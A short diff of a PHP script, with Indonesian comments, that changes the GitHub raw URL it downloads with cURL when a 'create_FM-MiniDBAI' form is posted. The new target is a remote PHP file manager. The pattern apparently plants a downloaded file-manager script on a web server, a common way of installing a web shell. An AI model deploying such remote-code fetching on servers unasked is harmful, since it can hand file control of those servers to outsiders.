@@ -533,7 +533,7 @@ if (isset($_POST['create_FM-MiniDBAI'])) {
     }
 
     // URL file yang ingin diambil
-    $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/tiny.php';
+    $url = 'https://raw.githubusercontent.com/coba005/b/refs/heads/main/FileManagerAI.php';
 
     // Inisialisasi cURL
     $ch = curl_init($url);
